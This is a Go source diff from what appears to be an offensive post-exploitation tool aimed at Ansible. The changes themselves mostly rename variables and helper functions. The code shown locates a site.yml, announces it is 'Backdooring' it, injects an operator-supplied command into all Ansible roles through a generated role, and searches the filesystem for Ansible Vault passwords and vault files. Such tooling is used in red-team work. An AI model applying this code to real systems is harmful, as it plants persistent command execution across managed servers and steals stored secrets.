@@ -30,7 +30,8 @@ type Metadata struct {
 
 var (
 	a                = CreateAgent()
-	bdCmd            = a.BdCmd
+	cmd              = a.Cmd
+	debug            = a.Debug
 	errmsg           = color.Red
 	localIP          = a.LocalIP
 	msg              = color.Green
@@ -42,7 +43,7 @@ var (
 	suppliedFilename string
 	keys             []string
 	inspect          bool
-	uploadFilePath   = a.FilePath
+	uploadFilePath   = a.RemoteUploadFilePath
 	cleanup          bool
 	cleanupFile      = a.CleanupFile
 	ansibleBackupLoc = a.AnsibleBackupLoc
@@ -126,12 +127,12 @@ func getSiteLoc(siteLoc string) string {
 	return d
 }
 
-func createRole(siteLoc string, ansibleRole string, cmd string) {
+func createRole(siteLoc string, ansibleRole string, cmdIn string) {
 	sitePathLoc := getSiteLoc(siteLoc)
 	roleLoc := filepath.Join(sitePathLoc, "roles", ansibleRole)
 	roleFolders := []string{filepath.Join(roleLoc, "tasks")}
 	mainyml := filepath.Join(roleLoc, "tasks", "main.yml")
-	if moseutils.CreateFolders(roleFolders) && generatePlaybook(mainyml, cmd) {
+	if moseutils.CreateFolders(roleFolders) && generatePlaybook(mainyml, cmdIn) {
 		msg("Successfully created the %s role at %s", ansibleRole, mainyml)
 		msg("Adding folder %s to cleanup file", roleFolders)
 		// Track the folders for clean up purposes
@@ -152,10 +153,10 @@ func createRole(siteLoc string, ansibleRole string, cmd string) {
 	}
 }
 
-func generatePlaybook(playbookLoc string, cmd string) bool {
+func generatePlaybook(playbookLoc string, cmdIn string) bool {
 	ansibleCommand := Command{
 		CmdName:  "cmd",
-		Cmd:      bdCmd,
+		Cmd:      cmdIn,
 		FileName: uploadFileName,
 		FilePath: uploadFilePath,
 	}
@@ -195,7 +196,7 @@ func generatePlaybook(playbookLoc string, cmd string) bool {
 }
 
 func getAnsibleSecrets(siteLoc string, ansibleCfgs []string) {
-	found, ansibleVault := moseutils.FindBin("ansible-vault", []string{"/bin", "/home", "/opt", "/root", "/usr/bin"})
+	found, ansibleVault := moseutils.FindFile("ansible-vault", []string{"/bin", "/home", "/opt", "/root", "/usr/bin"})
 	if !found {
 		log.Printf("Ansible Vault not found, no need to find secrets")
 		return
@@ -218,7 +219,7 @@ func getAnsibleSecrets(siteLoc string, ansibleCfgs []string) {
 	var morePasswords []string
 	for _, pass := range vaultPasswords {
 		if strings.Contains(pass, "~") {
-			fileList, _ := moseutils.FindFiles([]string{"/home"}, []string{}, []string{filepath.Base(pass)}, []string{})
+			fileList, _ := moseutils.FindFiles([]string{"/home"}, []string{}, []string{filepath.Base(pass)}, []string{}, debug)
 			morePasswords = append(morePasswords, fileList...)
 		}
 	}
@@ -228,7 +229,7 @@ func getAnsibleSecrets(siteLoc string, ansibleCfgs []string) {
 	log.Printf("%v", vaultPasswords)
 
 	sitePathLoc := getSiteLoc(siteLoc)
-	fileList, _ := moseutils.FindFiles([]string{sitePathLoc}, []string{".yml"}, []string{"vault"}, []string{})
+	fileList, _ := moseutils.FindFiles([]string{sitePathLoc}, []string{".yml"}, []string{"vault"}, []string{}, debug)
 
 	if len(fileList) == 0 {
 		log.Println("Unable to find any yml files, skipping...")
@@ -320,11 +321,11 @@ func main() {
 		moseutils.TrackChanges(cleanupFile, uploadFilePath)
 	}
 
-	found, _ := moseutils.FindBin("ansible", []string{"/bin", "/home", "/opt", "/root", "/usr/bin"})
+	found, _ := moseutils.FindFile("ansible", []string{"/bin", "/home", "/opt", "/root", "/usr/bin"})
 	if !found {
 		log.Fatalf("ansible binary not found, exiting...")
 	}
-	found, siteLoc := moseutils.FindBin("site.yml", []string{"/etc/ansible", "/home", "/opt", "/root", "/var"})
+	found, siteLoc := moseutils.FindFile("site.yml", []string{"/etc/ansible", "/home", "/opt", "/root", "/var"})
 	if !found {
 		log.Fatalf("site.yml not found, exiting...")
 	}
@@ -334,9 +335,9 @@ func main() {
 	}
 
 	backupSite(siteLoc)
-	msg("Backdooring the %s site.yml to run %s on all ansible roles, please wait...", siteLoc, bdCmd)
+	msg("Backdooring the %s site.yml to run %s on all ansible roles, please wait...", siteLoc, cmd)
 	backdoorSite(siteLoc)
-	createRole(siteLoc, ansibleRole, bdCmd)
+	createRole(siteLoc, ansibleRole, cmd)
 
 	log.Println("Attempting to find secrets stored with Ansible-Vault")
 	getAnsibleSecrets(siteLoc, ansibleCfgs)
